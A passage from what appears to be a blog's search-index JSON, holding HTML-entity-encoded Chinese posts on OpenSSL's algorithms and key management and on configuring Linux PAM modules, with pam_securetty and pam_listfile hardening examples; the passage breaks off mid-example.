OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;OpenSSL&#x4E00;&#x5171;&#x5B9E;&#x73B0;&#x4E86;4&#x79CD;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;DH&#x7B97;&#x6CD5;&#x3001;RSA&#x7B97;&#x6CD5;&#x3001;DSA&#x7B97;&#x6CD5;&#x548C;&#x692D;&#x5706;&#x66F2;&#x7EBF;&#x7B97;&#x6CD5;&#xFF08;EC&#xFF09;&#x3002;DH&#x7B97;&#x6CD5;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x3002;RSA&#x7B97;&#x6CD5;&#x65E2;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#xFF0C;&#x5F53;&#x7136;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x80FD;&#x591F;&#x5FCD;&#x53D7;&#x5176;&#x7F13;&#x6162;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x3002;DSA&#x7B97;&#x6CD5;&#x5219;&#x4E00;&#x822C;&#x53EA;&#x7528;&#x4E8E;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x3002; OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;OpenSSL&#x5B9E;&#x73B0;&#x4E86;5&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;&#xFF0C;&#x5206;&#x522B;&#x662F;MD2&#x3001;MD5&#x3001;MDC2&#x3001;SHA&#xFF08;SHA1&#xFF09;&#x548C;RIPEMD&#x3002;SHA&#x7B97;&#x6CD5;&#x4E8B;&#x5B9E;&#x4E0A;&#x5305;&#x62EC;&#x4E86;SHA&#x548C;SHA1&#x4E24;&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;&#xFF0C;&#x6B64;&#x5916;&#xFF0C;OpenSSL&#x8FD8;&#x5B9E;&#x73B0;&#x4E86;DSS&#x6807;&#x51C6;&#x4E2D;&#x89C4;&#x5B9A;&#x7684;&#x4E24;&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;DSS&#x548C;DSS1&#x3002; &#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x5BC6;&#x94A5;&#x548C;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x662F;PKI&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x7EC4;&#x6210;&#x90E8;&#x5206;&#xFF0C;OpenSSL&#x4E3A;&#x4E4B;&#x63D0;&#x4F9B;&#x4E86;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x79CD;&#x6807;&#x51C6;&#x3002; &#x9996;&#x5148;&#xFF0C;OpenSSL&#x5B9E;&#x73B0;&#x4E86;ASN.1&#x7684;&#x8BC1;&#x4E66;&#x548C;&#x5BC6;&#x94A5;&#x76F8;&#x5173;&#x6807;&#x51C6;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x8BC1;&#x4E66;&#x3001;&#x516C;&#x94A5;&#x3001;&#x79C1;&#x94A5;&#x3001;&#x8BC1;&#x4E66;&#x8BF7;&#x6C42;&#x4EE5;&#x53CA;CRL&#x7B49;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x7684;DER&#x3001;PEM&#x548C;BASE64&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;OpenSSL&#x63D0;&#x4F9B;&#x4E86;&#x4EA7;&#x751F;&#x5404;&#x79CD;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x5BF9;&#x548C;&#x5BF9;&#x79F0;&#x5BC6;&#x94A5;&#x7684;&#x65B9;&#x6CD5;&#x3001;&#x51FD;&#x6570;&#x548C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x516C;&#x94A5;&#x548C;&#x79C1;&#x94A5;&#x7684;DER&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;&#x5E76;&#x5B9E;&#x73B0;&#x4E86;&#x79C1;&#x94A5;&#x7684;PKCS#12&#x548C;PKCS#8&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;OpenSSL&#x5728;&#x6807;&#x51C6;&#x4E2D;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x79C1;&#x94A5;&#x7684;&#x52A0;&#x5BC6;&#x4FDD;&#x62A4;&#x529F;&#x80FD;&#xFF0C;&#x4F7F;&#x5F97;&#x5BC6;&#x94A5;&#x53EF;&#x4EE5;&#x5B89;&#x5168;&#x5730;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x548C;&#x5206;&#x53D1;&#x3002; &#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;OpenSSL&#x5B9E;&#x73B0;&#x4E86;&#x5BF9;&#x8BC1;&#x4E66;&#x7684;X.509&#x6807;&#x51C6;&#x7F16;&#x89E3;&#x7801;&#x3001;PKCS#12&#x683C;&#x5F0F;&#x7684;&#x7F16;&#x89E3;&#x7801;&#x4EE5;&#x53CA;PKCS#7&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;&#x5E76;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x6587;&#x672C;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x652F;&#x6301;&#x8BC1;&#x4E66;&#x7684;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#xFF0C;&#x5305;&#x62EC;&#x8BC1;&#x4E66;&#x5BC6;&#x94A5;&#x4EA7;&#x751F;&#x3001;&#x8BF7;&#x6C42;&#x4EA7;&#x751F;&#x3001;&#x8BC1;&#x4E66;&#x7B7E;&#x53D1;&#x3001;&#x540A;&#x9500;&#x548C;&#x9A8C;&#x8BC1;&#x7B49;&#x529F;&#x80FD;&#x3002; &#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;OpenSSL&#x63D0;&#x4F9B;&#x7684;CA&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5C0F;&#x578B;&#x7684;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#xFF08;CA&#xFF09;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x8BC1;&#x4E66;&#x7B7E;&#x53D1;&#x7684;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x548C;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x7684;&#x5927;&#x90E8;&#x5206;&#x673A;&#x5236;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux的PAM模块","date":"2022-06-07T04:53:50.000Z","path":"/posts/ee2f9f35/","text":"&#x4E00;&#x3001;pam&#x7B80;&#x4ECB; Linux-PAM&#xFF08;Pluggable Authentication Module for Linux&#xFF0C;Linux&#x53EF;&#x63D2;&#x5165;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;&#xFF09;&#x662F;&#x4E00;&#x5957;&#x5171;&#x4EAB;&#x5E93;&#xFF0C;&#x4F7F;&#x672C;&#x5730;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x9009;&#x62E9;&#x7A0B;&#x5E8F;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x4E0D;&#x7528;&#xFF08;&#x91CD;&#x5199;&#x7F16;&#x5199;&#xFF09;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x4E00;&#x4E2A;&#x5305;&#x542B;PAM&#x529F;&#x80FD;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0B;&#xFF0C;&#x5C31;&#x7B97;&#x5347;&#x7EA7;&#x672C;&#x5730;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#xFF0C;&#x4E5F;&#x4E0D;&#x7528;&#x4FEE;&#x6539;&#x7A0B;&#x5E8F;&#x3002; PAM&#x4F7F;&#x7528;&#x914D;&#x7F6E;/etc/pam.d/ &#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x6765;&#x7BA1;&#x7406;&#x5BF9;&#x7A0B;&#x5E8F;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x8C03;&#x7528;&#x54CD;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4ECE;&#x800C;&#x8C03;&#x7528;&#x672C;&#x5730;&#x7684;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;&#x3002;&#x6A21;&#x5757;&#x653E;&#x7F6E;&#x5728;/lib64/security&#xFF08;x86&#x7CFB;&#x7EDF;&#x653E;&#x5728;/lib/security&#xFF09;&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x4EE5;&#x52A0;&#x8F7D;&#x52A8;&#x6001;&#x5E93;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x5165;&#xFF0C;&#x50CF;&#x6211;&#x4EEC;&#x4F7F;&#x7528;su&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x63D0;&#x793A;&#x8F93;&#x5165;root&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x8FD9;&#x5C31;&#x662F;su&#x547D;&#x4EE4;&#x901A;&#x8FC7;&#x8C03;&#x7528;PAM&#x6A21;&#x5757;&#x5B9E;&#x73B0;&#x7684;&#x3002; PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD; PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x79CD;&#x5199;&#x6CD5;: &#x4E00;&#x79CD;&#x662F;&#x5199;&#x5728;/etc/pam.conf&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4F46;centos6&#x4E4B;&#x540E;&#x7684;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x6CA1;&#x6709;&#x4E86;&#x3002; &#x53E6;&#x4E00;&#x79CD;&#x5199;&#x6CD5;&#x662F;,&#x5C06;PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x653E;&#x5230;/etc/pam.d/&#x76EE;&#x5F55;&#x4E0B;,&#x5176;&#x89C4;&#x5219;&#x5185;&#x5BB9;&#x90FD;&#x662F;&#x4E0D;&#x5305;&#x542B; service &#x90E8;&#x5206;&#x7684;&#xFF0C;&#x5373;&#x4E0D;&#x5305;&#x542B;&#x670D;&#x52A1;&#x540D;&#x79F0;&#xFF0C;&#x800C;/etc/pam.d &#x76EE;&#x5F55;&#x4E0B;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x662F;&#x670D;&#x52A1;&#x540D;&#x79F0;&#x3002;&#x5982;: vsftpd,login&#x7B49;.,&#x53EA;&#x662F;&#x5C11;&#x4E86;&#x6700;&#x5DE6;&#x8FB9;&#x7684;&#x670D;&#x52A1;&#x540D;&#x5217;.&#x5982;:/etc/pam.d/sshd &#x7531;&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x5C06;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5206;&#x4E3A;&#x56DB;&#x5217;&#xFF0C;&#x7B2C;&#x4E00;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x7C7B;&#x578B;&#x7B2C;&#x4E8C;&#x5217;&#x4EE3;&#x8868;&#x63A7;&#x5236;&#x6807;&#x8BB0;&#x7B2C;&#x4E09;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x8DEF;&#x5F84;&#x7B2C;&#x56DB;&#x3001;&#x4E94;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x53C2;&#x6570; 1. PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;Linux-PAM&#x6709;&#x56DB;&#x79CD;&#x6A21;&#x5757;&#x7C7B;&#x578B;&#xFF0C;&#x5206;&#x522B;&#x4EE3;&#x8868;&#x56DB;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x4EFB;&#x52A1;&#x5B83;&#x4EEC;&#x662F;&#xFF1A;&#x8BA4;&#x8BC1;&#x7BA1;&#x7406;auth&#x3001;&#x8D26;&#x53F7;&#x7BA1;&#x7406;account&#x3001;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;session&#x3001;&#x5BC6;&#x7801;&#x7BA1;&#x7406;password&#xFF0C;&#x4E00;&#x4E2A;&#x7C7B;&#x578B;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x884C;&#xFF0C;&#x5B83;&#x4EEC;&#x6309;&#x987A;&#x5E8F;&#x4E00;&#x6B21;&#x7531;PAM&#x6A21;&#x5757;&#x8C03;&#x7528;&#x3002; &#x7BA1;&#x7406;&#x65B9;&#x5F0F; &#x8BF4;&#x660E; auth &#x7528;&#x6765;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x8FDB;&#x884C;&#x8BC6;&#x522B;&#x3002;&#x5982;&#xFF1A;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x6216;&#x5224;&#x65AD;&#x4F7F;&#x7528;&#x662F;&#x5426;&#x4E3A;root&#x7B49; account &#x5BF9;&#x8D26;&#x53F7;&#x7684;&#x4E2A;&#x5411;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x3002;&#x5982;&#xFF1A;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#xFF0C;&#x662F;&#x5426;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x7528;&#x6237;&#x6570;&#xFF0C;&#x6216;&#x662F;root&#x7528;&#x6237;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x5728;&#x8FD9;&#x4E2A;&#x7EC8;&#x7AEF;&#x767B;&#x5F55;&#x7B49; session &#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x7528;&#x6237;&#x6265;&#x4F30;&#x524D;&#x7684;&#xFF0C;&#x53CA;&#x7528;&#x6237;&#x9000;&#x51FA;&#x540E;&#x6240;&#x8981;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5982;&#xFF1A;&#x767B;&#x5F55;&#x8FDE;&#x63A5;&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x6237;&#x6570;&#x7684;&#x6253;&#x5F00;&#x4E0E;&#x5173;&#x95ED;&#xFF0C;&#x6302;&#x8F7D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7B49;&#x3002; password &#x4F7F;&#x7528;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x6765;&#x66F4;&#x65B0;&#x3002;&#x5982;&#xFF1A;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x5BC6;&#x7801; 2. PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;PAM&#x4F7F;&#x7528;&#x63A7;&#x5236;&#x6807;&#x8BB0;&#x6765;&#x5904;&#x7406;&#x548C;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#xFF08;&#x5728;&#x6B64;&#x53EA;&#x8BF4;&#x660E;&#x7B80;&#x5355;&#x7684;&#x8BA4;&#x8BC1;&#x6807;&#x8BB0;&#xFF09; &#x63A7;&#x5236;&#x6807;&#x8BB0; &#x8BF4;&#x660E; required &#x8868;&#x793A;&#x53CA;&#x65F6;&#x67D0;&#x4E2A;&#x6A21;&#x5757;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x6768;&#x5CE5;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x8981;&#x7B49;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;PAM&#x624D;&#x653E;&#x56DE;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x3002;&#x8FD9;&#x6837;&#x505A;&#x662F;&#x4E3A;&#x4E86;&#x4E0D;&#x8BA9;&#x7528;&#x6237;&#x77E5;&#x9053;&#x88AB;&#x54EA;&#x4E2A;&#x6A21;&#x5757;&#x62D2;&#x7EDD;&#x3002;&#x5982;&#x679C;&#x5BF9;&#x7528;&#x6237;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6210;&#x529F;&#x4FE1;&#x606F;&#x3002; requisite &#x4E0E;required&#x76F8;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x8FD4;&#x56DE;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x7ACB;&#x523B;&#x5411;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x5931;&#x8D25;&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7C7B;&#x578B;&#x5931;&#x8D25;&#x3002;&#x4E0D;&#x518D;&#x8FDB;&#x884C;&#x540E;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#x3002; sufficient &#x8868;&#x793A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;PAM&#x7ED3;&#x6784;&#x5C31;&#x7ACB;&#x523B;&#x8FD4;&#x56DE;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x4FE1;&#x606F;&#xFF08;&#x5373;&#x4F7F;&#x524D;&#x9762;&#x6709;&#x6A21;&#x5757;fail&#x4E86;&#xFF0C;&#x4E5F;&#x4F1A;&#x628A;fail&#x7ED3;&#x679C;&#x5FFD;&#x7565;&#x6389;&#xFF09;&#xFF0C;&#x628A;&#x63A7;&#x5236;&#x6743;&#x4EA4;&#x56DE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;&#x540E;&#x9762;&#x7684;&#x5C42;&#x53E0;&#x6A21;&#x5757;&#x5373;&#x4F7F;&#x4F7F;&#x7528;requisite&#x6216;&#x8005;required&#x63A7;&#x5236;&#x6807;&#x5FD7;&#xFF0C;&#x4E5F;&#x4E0D;&#x518D;&#x6267;&#x884C;&#x3002;&#x5982;&#x679C;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#xFF0C;sufficent&#x7684;&#x4F5C;&#x7528;&#x548C;optional&#x76F8;&#x540C; optional &#x8868;&#x793A;&#x5373;&#x4F7F;&#x672C;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x6A21;&#x5757;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x63A5;&#x53D7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x4E00;&#x822C;&#x8FD4;&#x56DE;PAM_IGNORE&#xFF08;&#x5FFD;&#x7565;&#xFF09; 3. &#x6A21;&#x5757;&#x8DEF;&#x5F84;&#x6A21;&#x5757;&#x8DEF;&#x5F84;.&#x5373;&#x8981;&#x8C03;&#x7528;&#x6A21;&#x5757;&#x7684;&#x4F4D;&#x7F6E;. &#x5982;&#x679C;&#x662F;64&#x4F4D;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E00;&#x822C;&#x4FDD;&#x5B58;&#x5728;/lib64/security,&#x5982;: pam_unix.so&#x540C;&#x4E00;&#x4E2A;&#x6A21;&#x5757;,&#x53EF;&#x4EE5;&#x51FA;&#x73B0;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;&#x4E2D;.&#x5B83;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;&#x4E2D;&#x6240;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x4E0D;&#x76F8;&#x540C;.&#x8FD9;&#x662F;&#x7531;&#x4E8E;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;,&#x7F16;&#x5236;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x6267;&#x884C;&#x51FD;&#x6570;. 4. &#x6A21;&#x5757;&#x53C2;&#x6570;&#x6A21;&#x5757;&#x53C2;&#x6570;,&#x5373;&#x4F20;&#x9012;&#x7ED9;&#x6A21;&#x5757;&#x7684;&#x53C2;&#x6570;.&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;,&#x4E4B;&#x95F4;&#x7528;&#x7A7A;&#x683C;&#x5206;&#x9694;&#x5F00;,&#x5982;:password required pam_unix.so nullok obscure min=4 max=8 md5 5. &#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD; PAM&#x6A21;&#x5757; &#x7ED3;&#x5408;&#x7BA1;&#x7406;&#x7C7B;&#x578B; &#x8BF4;&#x660E; pam_unix.so auth &#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5E76;&#x4E0E;/ec/shadow&#x6587;&#x4EF6;&#x76F8;&#x6BD4;&#x5BF9;&#x3002;&#x5339;&#x914D;&#x8FD4;&#x56DE;0 - account &#x68C0;&#x67E5;&#x7528;&#x6237;&#x7684;&#x8D26;&#x6237;&#x4FE1;&#x606F;&#xFF08;&#x5305;&#x62EC;&#x662F;&#x5426;&#x8FC7;&#x671F;&#x7B49;&#xFF09;&#x3002;&#x8D26;&#x6237;&#x53EF;&#x7528;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;0. - password &#x4FEE;&#x6539;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x5C06;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4F5C;&#x4E3A;&#x7528;&#x6237;&#x7684;&#x65B0;&#x5BC6;&#x7801;&#x66F4;&#x65B0;shadow&#x6587;&#x4EF6; pam_shells.so auth &#x5982;&#x679C;&#x7528;&#x6237;&#x5411;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x7684;shell&#x5FC5;&#x987B;&#x662F;&#x5728;/etc/shells&#x6587;&#x4EF6;&#x4E2D;&#x4E4B;&#x4E00;&#x7684;shell - account pam_deny.so account &#x8BE5;&#x6A21;&#x5757;&#x7528;&#x7528;&#x4E8E;&#x62D2;&#x7EDD;&#x8BBF;&#x95EE; - auth - password - session pam_permit.so auth &#x8BE5;&#x6A21;&#x5757;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x90FD;&#x8FD4;&#x56DE;&#x6210;&#x529F; - account - session pam_securetty.so auth &#x5982;&#x679C;&#x7528;&#x6237;&#x8981;&#x4EE5;root&#x767B;&#x5F55;&#x65F6;&#xFF0C;&#x5219;&#x767B;&#x5F55;&#x7684;tty&#x5FC5;&#x987B;&#x5728;/etc/securetty&#x4E4B;&#x4E2D; pam_listfile.so auth &#x8BBF;&#x95EE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x63A7;&#x5236;&#x5F00;&#x5173; - account - password - session pam_cracklib.so password &#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x53EF;&#x4EE5;&#x63D2;&#x5165;&#x5230;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x7684;&#x5BC6;&#x7801;&#x6808;&#x4E2D;&#xFF0C;&#x7528;&#x4E8E;&#x68C0;&#x67E5;&#x5BC6;&#x7801;&#x7684;&#x5F3A;&#x5EA6;&#x3002; pam_limits.so session &#x5B9A;&#x4E49;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4E0A;&#x9650;&#xFF0C;root&#x7528;&#x6237;&#x4E5F;&#x4F1A;&#x53D7;&#x6B64;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;/etc/security/limits.conf&#x6216;/etc/security/limits.d/*.conf&#x6765;&#x8BBE;&#x5B9A; 4. &#x5B9E;&#x4F8B;1&#x3001;pam_securetty.so &#x9650;&#x5236;root&#x4ECE;tty1,tty2&#xFF0C;tty5&#x767B;&#x5F55;&#xFF08;&#x65E0;&#x5B9E;&#x9645;&#x610F;&#x4E49;&#xFF0C;&#x53EA;&#x662F;&#x6F14;&#x793A;pam_securetty&#x7684;&#x7528;&#x6CD5;&#xFF09;&#x5728;/etc/pam.d/login&#x4E2D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4E00;&#x884C; auth required pam_securetty.so &#x5728;/etc/securetty&#x4E2D;&#x5C06;tty1&#x3001;tty2&#x3001;tty5&#x6CE8;&#x91CA;&#x5373;&#x53EF; &#x4E4B;&#x540E;&#x4F7F;&#x7528;root&#x7528;&#x6237;&#x518D;&#x6B21;&#x767B;&#x5F55;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0; &#x8FD9;&#x4E48;&#x505A;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x662F;&#x53EA;&#x9650;&#x5236;root&#x7528;&#x6237;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x5B83;&#x7528;&#x6237;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x6765;&#x9650;&#x5B9A;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x6765;&#x589E;&#x5F3A;&#x4E00;&#x4E0B;&#x5B89;&#x5168;&#x6027;&#x3002; 2&#x3001;pam_listfile.so &#x4EC5;jaking1&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;ssh&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x5728;/etc/pam.d/sshd&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761; auth required pam_listfile.so item=user sense=allow file=/etc/sshdusers onerr=succeed &#x6DFB;&#x52A0;&#x4E24;&#x4E2A;&#x7528;&#x6237;jaking1&#x548C;jaking2&#x5E76;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801; useradd jaking1 useradd jaking2 echo jaking666 | passwd --stdin jaking1 echo jaking666 | passwd --stdin jaking2 &#x7F16;&#x8F91;file&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x7528;&#x6237;jaking1 echo &quot;jaking1&quot; &gt; /etc/sshdusers cat /etc/sshdusers 